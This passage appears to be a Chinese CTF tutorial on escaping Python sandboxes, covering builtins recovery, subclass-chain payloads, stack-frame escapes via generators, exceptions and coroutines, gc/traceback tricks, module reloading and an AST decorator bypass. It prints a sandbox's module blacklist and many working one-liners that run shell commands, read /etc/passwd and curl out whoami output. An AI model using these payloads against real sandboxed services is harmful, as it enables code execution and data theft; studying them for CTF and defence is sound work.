<p>这是一个低级别的钩子，用于拦截属性访问，可以对其进行<code>重载</code>以<code>自定义属性访问行为</code>。</p>
<pre><code class="highlight plaintext">在调用时，一般都是__getattibute__先被调用，当抛出AttributeError 异常时，__getattr__ 才会被调用。
另外，所有的类都会有__getattribute__属性，而不一定有__getattr__属性</code></pre>



<h4 id="getitem"><a href="#getitem" class="headerlink" title="__getitem__"></a><code>__getitem__</code></h4><p><code>__getitem__</code>方法适用于获取元素</p>
<p>当使用<code>obj[key]</code>这样的操作时，python就会自动调用它</p>
<p>这里的key可以是整数索引也可以是其他能当”标签”的键</p>
<p>而你可以用get方法来获得键的值</p>
<h3 id="妙手回春之借刀杀人-self-builtins"><a href="#妙手回春之借刀杀人-self-builtins" class="headerlink" title="妙手回春之借刀杀人(self builtins)"></a>妙手回春之借刀杀人(self builtins)</h3><p>有时沙箱中会用<code>exec</code>限制你的命名空间</p>
<p>因为<code>exec</code>的第二个参数是可以自定义的，通过修改，删除命名空间里的函数就达到了限制你操作的效果，例子来源于 iscc_2016_pycalc</p>
<pre><code class="highlight plaintext">def _hook_import_(name, *args, **kwargs):
    module_blacklist = [&#x27;os&#x27;, &#x27;sys&#x27;, &#x27;time&#x27;, &#x27;bdb&#x27;, &#x27;bsddb&#x27;, &#x27;cgi&#x27;,
                        &#x27;CGIHTTPServer&#x27;, &#x27;cgitb&#x27;, &#x27;compileall&#x27;, &#x27;ctypes&#x27;, &#x27;dircache&#x27;,
                        &#x27;doctest&#x27;, &#x27;dumbdbm&#x27;, &#x27;filecmp&#x27;, &#x27;fileinput&#x27;, &#x27;ftplib&#x27;, &#x27;gzip&#x27;,
                        &#x27;getopt&#x27;, &#x27;getpass&#x27;, &#x27;gettext&#x27;, &#x27;httplib&#x27;, &#x27;importlib&#x27;, &#x27;imputil&#x27;,
                        &#x27;linecache&#x27;, &#x27;macpath&#x27;, &#x27;mailbox&#x27;, &#x27;mailcap&#x27;, &#x27;mhlib&#x27;, &#x27;mimetools&#x27;,
                        &#x27;mimetypes&#x27;, &#x27;modulefinder&#x27;, &#x27;multiprocessing&#x27;, &#x27;netrc&#x27;, &#x27;new&#x27;,
                        &#x27;optparse&#x27;, &#x27;pdb&#x27;, &#x27;pipes&#x27;, &#x27;pkgutil&#x27;, &#x27;platform&#x27;, &#x27;popen2&#x27;, &#x27;poplib&#x27;,
                        &#x27;posix&#x27;, &#x27;posixfile&#x27;, &#x27;profile&#x27;, &#x27;pstats&#x27;, &#x27;pty&#x27;, &#x27;py_compile&#x27;,
                        &#x27;pyclbr&#x27;, &#x27;pydoc&#x27;, &#x27;rexec&#x27;, &#x27;runpy&#x27;, &#x27;shlex&#x27;, &#x27;shutil&#x27;, &#x27;SimpleHTTPServer&#x27;,
                        &#x27;SimpleXMLRPCServer&#x27;, &#x27;site&#x27;, &#x27;smtpd&#x27;, &#x27;socket&#x27;, &#x27;SocketServer&#x27;,
                        &#x27;subprocess&#x27;, &#x27;sysconfig&#x27;, &#x27;tabnanny&#x27;, &#x27;tarfile&#x27;, &#x27;telnetlib&#x27;,
                        &#x27;tempfile&#x27;, &#x27;Tix&#x27;, &#x27;trace&#x27;, &#x27;turtle&#x27;, &#x27;urllib&#x27;, &#x27;urllib2&#x27;,
                        &#x27;user&#x27;, &#x27;uu&#x27;, &#x27;webbrowser&#x27;, &#x27;whichdb&#x27;, &#x27;zipfile&#x27;, &#x27;zipimport&#x27;]
    for forbid in module_blacklist:
        if name == forbid:        # don&#x27;t let user import these modules
            raise RuntimeError(&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;.format(forbid))
    # normal modules can be imported
    return __import__(name, *args, **kwargs)

def sandbox_exec(command):      # sandbox user input
    result = 0
    __sandboxed_builtins__ = dict(__builtins__.__dict__)
    __sandboxed_builtins__[&#x27;__import__&#x27;] = _hook_import_    # hook import
    del __sandboxed_builtins__[&#x27;open&#x27;]
    _global = &#123;
        &#x27;__builtins__&#x27;: __sandboxed_builtins__
    &#125;

    ...
        exec command in _global     # do calculate in a sandboxed  
    ...</code></pre>

<ol>
<li>沙箱首先获取 <code>__builtins__</code>，然后依据现有的 <code>__builtins__</code> 来构建命名空间。</li>
<li>修改 <code>__import__</code> 函数为自定义的<code>_hook_import_</code></li>
<li>删除 open 函数防止文件操作</li>
<li>exec 命令。</li>
</ol>
<p>绕过方式：</p>
<p>由于 exec 运行在特定的命名空间里，可以通过获取其他命名空间里的 <code>__builtins__</code>（这个<code>__builtins__</code>保存的就是原始<code>__builtins__</code>的引用），比如 types 库，来执行任意命令：</p>
<pre><code class="highlight plaintext">__import__(&#x27;types&#x27;).__builtins__
__import__(&#x27;string&#x27;).__builtins__</code></pre>

<h3 id="继承链-no-builtins"><a href="#继承链-no-builtins" class="headerlink" title="继承链(no builtins)"></a>继承链(no builtins)</h3><p>什么?<code>builtins</code>被清光了?没事我有继承链</p>
<p>poc原理和SSTI相似，就是利用父类和子类之间的继承关系，不断访问内部属性来达到调用，实现文件读取或者RCE的效果</p>
<p><strong>前提是没有把attribute给你禁掉，禁掉之后这种方法就行不通了</strong></p>
<p>没禁掉的情况基本无敌吧大概</p>
<p><strong>RCE</strong></p>
<pre><code class="highlight plaintext"># os
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;ls&quot;)

# subprocess 
[ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__ == &#x27;Popen&#x27;][0](&#x27;ls&#x27;)

# builtins
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;]

# help
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;][&#x27;help&#x27;]

[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&#x27;__builtins__&#x27;]

#sys
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;sys&quot; in x.__init__.__globals__ ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)

[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;_sitebuiltins.&quot; in str(x) and not &quot;_Helper&quot; in str(x) ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)

#commands (not very common)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;commands&quot; in x.__init__.__globals__ ][0][&quot;commands&quot;].getoutput(&quot;ls&quot;)

#pty (not very common)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pty&quot; in x.__init__.__globals__ ][0][&quot;pty&quot;].spawn(&quot;ls&quot;)

#importlib
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)

#imp
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)

#pdb
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pdb&quot; in x.__init__.__globals__ ][0][&quot;pdb&quot;].os.system(&quot;ls&quot;)

# ctypes
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;ctypes&#x27;).CDLL(None).system(&#x27;ls /&#x27;.encode())

# multiprocessing
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;multiprocessing&#x27;).Process(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;curl localhost:9999/?a=`whoami`&#x27;)).start()</code></pre>

<p><strong>File</strong></p>
<pre><code class="highlight plaintext">[ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;FileLoader&quot; ][0].get_data(0,&quot;/etc/passwd&quot;)</code></pre>



<h3 id="栈帧逃逸"><a href="#栈帧逃逸" class="headerlink" title="栈帧逃逸"></a>栈帧逃逸</h3><p>先了解一些概念吧。</p>
<p><strong>栈帧</strong></p>
<p><strong>生成器</strong></p>
<p>生成器（Generator）是 Python 中一种特殊的迭代器，它可以通过简单的函数和表达式来创建。生成器的主要特点是能够逐个产生值，并且在每次生成值后保留当前的状态，以便下次调用时可以继续生成值。这使得生成器非常适合处理大型数据集或需要延迟计算的情况。</p>
<p>在 Python 中，生成器可以使用 yield 关键字来定义。yield 用于产生一个值，并在保留当前状态的同时暂停函数的执行。当下一次调用生成器时，函数会从上次暂停的位置继续执行，直到遇到下一个 yield 语句或者函数结束。</p>
<pre><code class="highlight python"><span class="keyword">def</span> <span class="title function_">f</span>():
    a=<span class="number">1</span>
    <span class="keyword">while</span> <span class="literal">True</span>:
        <span class="keyword">yield</span> a
        a+=<span class="number">1</span>
f=f()
<span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#1</span>
<span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#2</span>
<span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#3</span>
<span class="built_in">next</span>() 函数在Python中用于获取迭代器的下一个元素

<span class="comment">#生成器表达式:</span>
 gen_exp = (x * x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>))

 <span class="keyword">for</span> num <span class="keyword">in</span> gen_exp:
     <span class="built_in">print</span>(num)
<span class="comment">#类似于列表推导式，但使用小括号 () 而不是方括号 [] 来创建生成器表达式</span></code></pre>

<p><strong>生成器属性</strong></p>
<p><code>gi_code</code>: 生成器对应的code对象。<br><code>gi_frame</code>: 生成器对应的frame（栈帧）对象。<br><code>gi_running</code>: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。<br><code>gi_yieldfrom</code>：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。<br><code>gi_frame.f_locals</code>：一个字典，包含生成器当前帧的本地变量。</p>
<p><strong>着重介绍一下 gi_frame 属性</strong><br><code>gi_frame</code> 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。</p>
<p>下面是一个简单的示例，演示了如何使用生成器的 gi_frame 属性来获取生成器的当前帧信息:</p>
<pre><code class="highlight python"><span class="keyword">def</span> <span class="title function_">my_generator</span>():
    <span class="keyword">yield</span> <span class="number">1</span>
    <span class="keyword">yield</span> <span class="number">2</span>
    <span class="keyword">yield</span> <span class="number">3</span>

gen = my_generator()

<span class="comment"># 获取生成器的当前帧信息</span>
frame = gen.gi_frame

<span class="comment"># 输出生成器的当前帧信息</span>
<span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, frame.f_locals)
<span class="built_in">print</span>(<span class="string">&quot;Global Variables:&quot;</span>, frame.f_globals)
<span class="built_in">print</span>(<span class="string">&quot;Code Object:&quot;</span>, frame.f_code)
<span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer:&quot;</span>, frame.f_lasti)</code></pre>

<p><strong>栈帧(frame)</strong></p>
<p>在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p>
<p>栈帧包含了以下几个重要的属性：<br><code>f_locals</code>: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。<br><code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。<br><code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。<br><code>f_lasti</code>: 整数，表示最后执行的字节码指令的索引。<br><code>f_back</code>: 指向上一级调用栈帧的引用，用于构建调用栈</p>
<h4 id="生成器栈帧逃逸"><a href="#生成器栈帧逃逸" class="headerlink" title="生成器栈帧逃逸"></a><strong>生成器栈帧逃逸</strong></h4><p>原理其实就是生成器的栈帧对象通过<code>f_back</code>不断返回前一帧从而去获取<code>globals</code>全局符号表</p>
<pre><code class="highlight python">s3cret=<span class="string">&quot;this is flag&quot;</span>
<span class="keyword">def</span> <span class="title function_">f</span>():
        <span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back

g = f().gi_frame  <span class="comment">#生成器</span>
<span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, g.f_globals)</code></pre>

<p>在这里其实就可以看到成功逃出</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250506102803052.png" alt="image-20250506102803052"></p>
<p>而查看locals时就会发现是空列表</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250506102848722.png" alt="image-20250506102848722"></p>
<p>模拟一下沙箱的操作</p>
<pre><code class="highlight python">codes=<span class="string">&#x27;&#x27;&#x27;</span>
<span class="string">def waff():</span>
<span class="string">    def f():</span>
<span class="string">        yield g.gi_frame.f_back</span>
<span class="string"></span>
<span class="string">    g = f()  #生成器</span>
<span class="string">    frame = next(g) #获取到生成器的栈帧对象</span>
<span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span>
<span class="string">    return b</span>
<span class="string">b=waff()</span>
<span class="string">&#x27;&#x27;&#x27;</span>
<span class="built_in">locals</span>=&#123;&#125;
code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)
<span class="built_in">exec</span>(code,<span class="built_in">locals</span>)
<span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])
<span class="comment">#使用next获取到的就是yield定义的值，这里获取到的就是g.gi_frame.f_back</span>
<span class="comment">#使用g.gi_frame.f_back的话，那么g = f()就必须为g，用的就是这个生成器对象的栈帧</span>
<span class="comment">#compile(codes, &quot;test&quot;, &quot;exec&quot;)就是设置了名称为test的python沙箱环境</span></code></pre>

<p>运行得到 <code>this is flag</code> ,成功逃逸出沙箱获取到<code>s3cret</code>变量值</p>
<p>这里也可以使用<code>f_locals</code>去代替<code>f_globals</code>效果是相同的，但是要注意，<code>locals</code>返回的是局部符号表，它包含了在当前函数或方法内部定义的变量。这些局部变量只在当前函数或方法的执行过程中存在，并且只能在该函数或方法内部访问。当函数执行完毕后，这些局部变量就会被销毁。</p>
<p>怎么用呢，可以用来配合修改函数；也可以拿<code>_globals</code>反打rce</p>
<pre><code class="highlight plaintext">2024L3HCTF 打int函数返回值 参考链接:https://xz.aliyun.com/news/13075</code></pre>

<h4 id="异常栈帧逃逸"><a href="#异常栈帧逃逸" class="headerlink" title="异常栈帧逃逸"></a><strong>异常栈帧逃逸</strong></h4><p>通过主动抛出异常+抓抛出错误的栈帧来逃逸沙箱</p>
<p>给一串简单的实例:</p>
<pre><code class="highlight python"><span class="keyword">try</span>:
    <span class="number">1</span>/<span class="number">0</span>
<span class="keyword">except</span> Exception <span class="keyword">as</span> e:
    frame=e.__traceback__.tb_frame
    builtins=frame.f_globals[<span class="string">&#x27;__builtins__&#x27;</span>]
    builtins.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250603194452776.png" alt="image-20250603194452776"></p>
<p>可以看到成功执行了。</p>
<h4 id="异步栈帧逃逸"><a href="#异步栈帧逃逸" class="headerlink" title="异步栈帧逃逸"></a>异步栈帧逃逸</h4><pre><code class="highlight python"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">a</span>():
    <span class="keyword">pass</span>
a().cr_frame.f_globals</code></pre>

<h3 id="变量覆盖与函数篡改"><a href="#变量覆盖与函数篡改" class="headerlink" title="变量覆盖与函数篡改"></a>变量覆盖与函数篡改</h3><p>优雅啊，很优雅啊。。</p>
<p>这里简单一些的就是给出blacklist但是是可控的，可以直接改变量然后直接执行命令就可以了</p>
<p>在 Python 中，sys 模块提供了许多与 Python 解释器和其环境交互的功能，包括对全局变量和函数的操作。在沙箱中获取 sys 模块就可以达到变量覆盖与函数擦篡改的目的.</p>
<p>sys.modules 存放了现有模块的引用, 通过访问 <code>sys.modules[&#39;__main__&#39;]</code> 就可以访问当当前模块定义的所有函数以及全局变量</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; aaa = &#x27;bbb&#x27;
&gt;&gt;&gt; def my_input():
...     dict_global = dict()
...     while True:
...       try:
...           input_data = input(&quot;&gt; &quot;)
...       except EOFError:
...           print()
...           break
...       except KeyboardInterrupt:
...           print(&#x27;bye~~&#x27;)
...           continue
...       if input_data == &#x27;&#x27;:
...           continue
...       try:
...           complie_code = compile(input_data, &#x27;&lt;string&gt;&#x27;, &#x27;single&#x27;)
...       except SyntaxError as err:
...           print(err)
...           continue
...       try:
...           exec(complie_code, dict_global)
...       except Exception as err:
...           print(err)
... 
&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.modules[&#x27;__main__&#x27;]
&lt;module &#x27;__main__&#x27; (built-in)&gt;
&gt;&gt;&gt; dir(sys.modules[&#x27;__main__&#x27;])
[&#x27;__annotations__&#x27;, &#x27;__builtins__&#x27;, &#x27;__doc__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;aaa&#x27;, &#x27;my_input&#x27;, &#x27;sys&#x27;]
&gt;&gt;&gt; sys.modules[&#x27;__main__&#x27;].aaa
&#x27;bbb&#x27;</code></pre>

<p>除了通过 sys 模块来获取当前模块的变量以及函数外,还可以通过 <code>__builtins__</code>篡改内置函数等,这只是一个思路.</p>
<p>总体来说,只要获取了某个函数或者变量就可以篡改, 难点就在于获取.</p>
<h4 id="利用-gc-获取已删除模块"><a href="#利用-gc-获取已删除模块" class="headerlink" title="利用 gc 获取已删除模块"></a>利用 gc 获取已删除模块</h4><p>这个思路来源于 <a href="https://github.com/fab1ano/hxp-ctf-20/tree/master/audited">writeup by fab1ano – github</a></p>
<p>这道题的目标是覆盖 <code>__main__</code> 中的 <code>__exit</code> 函数,但是题目将 <code>sys.modules[&#39;__main__&#39;]</code> 删除了,无法直接获取.</p>
<pre><code class="highlight plaintext">for module in set(sys.modules.keys()):
    if module in sys.modules:
        del sys.modules[module]</code></pre>

<p><code>gc</code> 是Python的内置模块，全名为”garbage collector”，中文译为”垃圾回收”。<code>gc</code> 模块主要的功能是提供一个接口供开发者直接与 Python 的垃圾回收机制进行交互。</p>
<p>Python 使用了引用计数作为其主要的内存管理机制，同时也引入了循环垃圾回收器来检测并收集循环引用的对象。<code>gc</code> 模块提供了一些函数，让你可以直接控制这个循环垃圾回收器。</p>
<p>下面是一些 <code>gc</code> 模块中的主要函数：</p>
<ol>
<li><code>gc.collect(generation=2)</code>：这个函数会立即触发一次垃圾回收。你可以通过 <code>generation</code> 参数指定要收集的代数。Python 的垃圾回收器是分代的，新创建的对象在第一代，经历过一次垃圾回收后仍然存活的对象会被移到下一代。</li>
<li><code>gc.get_objects()</code>：这个函数会返回当前被管理的所有对象的列表。</li>
<li><code>gc.get_referrers(*objs)</code>：这个函数会返回指向 <code>objs</code> 中任何一个对象的对象列表。</li>
</ol>
<p>exp 如下</p>
<pre><code class="highlight plaintext">for obj in gc.get_objects():
    if &#x27;__name__&#x27; in dir(obj):
        if &#x27;__main__&#x27; in obj.__name__:
            print(&#x27;Found module __main__&#x27;)
            mod_main = obj
        if &#x27;os&#x27; == obj.__name__:
            print(&#x27;Found module os&#x27;)
            mod_os = obj
mod_main.__exit = lambda x : print(&quot;[+] bypass&quot;)</code></pre>

<p>在 3.11 版本和 python 3.8.10 版本中测试发现会触发 gc.get_objects hook 导致无法成功.</p>
<h4 id="利用-traceback-获取模块"><a href="#利用-traceback-获取模块" class="headerlink" title="利用 traceback 获取模块"></a>利用 traceback 获取模块</h4><p>这个思路来源于 <a href="https://github.com/hstocks/ctf_writeups/blob/master/2020/hxp/audited/README.md">writeup by hstocks – github</a></p>
<p>主动抛出异常, 并获取其后要执行的代码, 然后将<code>__exit</code> 进行替换, 思路也是十分巧妙.</p>
<pre><code class="highlight plaintext">try:
    raise Exception()
except Exception as e:
    _, _, tb = sys.exc_info()
    nxt_frame = tb.tb_frame

    # Walk up stack frames until we find one which
    # has a reference to the audit function
    while nxt_frame:
        if &#x27;audit&#x27; in nxt_frame.f_globals:
            break
        nxt_frame = nxt_frame.f_back

    # Neuter the __exit function
    nxt_frame.f_globals[&#x27;__exit&#x27;] = print

    # Now we&#x27;re free to call whatever we want
    os.system(&#x27;cat /flag*&#x27;)</code></pre>

<p>但是实际测试时使用 python 3.11 发现 <code>nxt_frame = tb.tb_frame</code> 会触发 <code>object.__getattr__</code> hook. 不同的版本中触发 hook 的地方会有差异,这个 payload 可能仅在 python 3.9 (题目版本)中适用</p>
<h3 id="模块重载-原module被篡改"><a href="#模块重载-原module被篡改" class="headerlink" title="模块重载(原module被篡改)"></a>模块重载(原module被篡改)</h3><p>为什么要<strong>重载</strong>呢？因为目标模块&#x2F;方法在一开始就被<strong>删除&#x2F;覆盖</strong>了，但是通过一些手段，就可以重新加载这些模块</p>
<pre><code class="highlight bash">&gt;&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]
&lt;built-in <span class="keyword">function</span> <span class="built_in">eval</span>&gt;
&gt;&gt;&gt; del __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]
&gt;&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]
Traceback (most recent call last):
  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;
KeyError: <span class="string">&#x27;eval&#x27;</span></code></pre>

<h4 id="reload-重新加载"><a href="#reload-重新加载" class="headerlink" title="reload 重新加载"></a>reload 重新加载</h4><p>reload函数在不同版本中的位置不同</p>
<pre><code class="highlight plaintext">Python 2.x
&gt;&gt;&gt;reload(module)

Python 2.x-3.3
&gt;&gt;&gt;import imp
&gt;&gt;&gt;impo.reload(module)

Python 3.4-latest
&gt;&gt;&gt;import importlib
&gt;&gt;&gt;importlib.reload(module)</code></pre>

<p>reload 函数可以重新加载模块，这样被删除的函数能被重新加载</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
&lt;built-in function eval&gt;
&gt;&gt;&gt; del __builtins__.__dict__[&#x27;eval&#x27;]
&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
KeyError: &#x27;eval&#x27;
&gt;&gt;&gt; reload(__builtins__)
&lt;module &#x27;__builtin__&#x27; (built-in)&gt;
&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
&lt;built-in function eval&gt;</code></pre>

<p>在 Python 3 中，reload() 函数被移动到 <code>importlib</code> 模块中，所以如果要使用 reload() 函数，需要先导入<code> importlib</code> 模块。</p>
<p>貌似新版本的 python 即使运行了<code> importlib.reload</code> 也无法恢复了。</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; importlib.reload(__builtins__)
&lt;module &#x27;builtins&#x27; (built-in)&gt;
&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
KeyError: &#x27;eval&#x27;</code></pre>

<h4 id="恢复-sys-modules"><a href="#恢复-sys-modules" class="headerlink" title="恢复 sys.modules"></a>恢复 <code>sys.modules</code></h4><p>一些过滤中可能将 <code>sys.modules[&#39;os&#39;]</code> 进行修改. 这个时候即使将 <code>os</code> 模块导入进来,也是无法使用的.</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;
&gt;&gt;&gt; __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
AttributeError: &#x27;str&#x27; object has no attribute &#x27;system&#x27;</code></pre>

<p>由于很多别的命令执行库也使用到了 os,因此也会受到相应的影响,例如 subprocess</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; __import__(&#x27;subprocess&#x27;).Popen(&#x27;whoami&#x27;, shell=True)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
  File &quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;, line 688, in &lt;module&gt;
    class Popen(object):
  File &quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;, line 1708, in Popen
    def _handle_exitstatus(self, sts, _WIFSIGNALED=os.WIFSIGNALED,
AttributeError: &#x27;str&#x27; object has no attribute &#x27;WIFSIGNALED&#x27;</code></pre>

<p>由于 import 导入模块时会检查 sys.modules 中是否已经有这个类，如果有则不加载,没有则加载.因此我们只需要将 os 模块删除,然后再次导入即可.</p>
<pre><code class="highlight plaintext">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27; # oj 为你加的

del sys.modules[&#x27;os&#x27;]
import os
os.system(&#x27;ls&#x27;)</code></pre>

<h4 id="globals"><a href="#globals" class="headerlink" title="globals()"></a>globals()</h4><p>有些时候沙箱会设置</p>
<pre><code class="highlight plaintext">def blacklist_fun_callback(*args):
    print(&quot;Player! It&#x27;s already banned!&quot;)

vars = blacklist_fun_callback
attr = blacklist_fun_callback
dir = blacklist_fun_callback
getattr = blacklist_fun_callback
exec = blacklist_fun_callback
__import__ = blacklist_fun_callback
compile = blacklist_fun_callback</code></pre>

<p>来覆盖内置函数，限制函数的使用。</p>
<p>但是<code>builtins</code>是一个不可变的模块对象，这样修改仅能够在当前的作用域中生效，而 globals() 中存放了 builtins 模块的索引，因此可以通过下面的方式获取到原始的方法。</p>
<pre><code class="highlight plaintext">globals()[&quot;__builtins__&quot;][&#x27;breakpoint&#x27;]</code></pre>

<p>但是题目如果使用了下面的方式来删除，那就没有办法了，即使 reload 重新导入 <code>builtins</code> 模块，较新版本的 python 中也无法恢复。</p>
<pre><code class="highlight plaintext">del globals()[&quot;__builtins__&quot;].breakpoint</code></pre>

<h3 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h3><p>AST 沙箱会将用户的输入转化为操作码,此时字符串层面的变换基本上没用了,一般情况下考虑绕过 AST 黑名单. 例如下面的沙箱禁止了 <code>ast.Import|ast.ImportFrom|ast.Call</code> 这三类操作, 这样一来就无法导入模块和执行函数.</p>
<pre><code class="highlight plaintext">import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f&quot;ERROR: Banned statement &#123;x&#125;&quot;)
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print(&quot;-- Please enter code (last line must contain only --END)&quot;)
source_code = &quot;&quot;
while True:
  line = sys.stdin.readline()
  if line.startswith(&quot;--END&quot;):
    break
  source_code += line

tree = compile(source_code, &quot;input.py&quot;, &#x27;exec&#x27;, flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print(&quot;-- Executing safe code:&quot;)
  compiled = compile(source_code, &quot;input.py&quot;, &#x27;exec&#x27;)
  exec(compiled)</code></pre>

<p>下面的 without call 来源于 hacktricks</p>
<h4 id="without-call"><a href="#without-call" class="headerlink" title="without call"></a>without call</h4><p>如果基于 AST 的沙箱限制了执行函数,那么就需要找到一种不需要执行函数的方式执行系统命令.</p>
<h5 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a><strong>装饰器</strong></h5><p>利用 payload 如下，乍一看可能有些迷惑，但该 payload 实际上等效于 exec(input(X))</p>
<pre><code class="highlight plaintext">@exec
@input
class X:
    pass</code></pre>

<p>当我们输入上述的代码后, Python 会打开输入,此时我们再输入 payload 就可以成功执行命令.</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; @exec
... @input
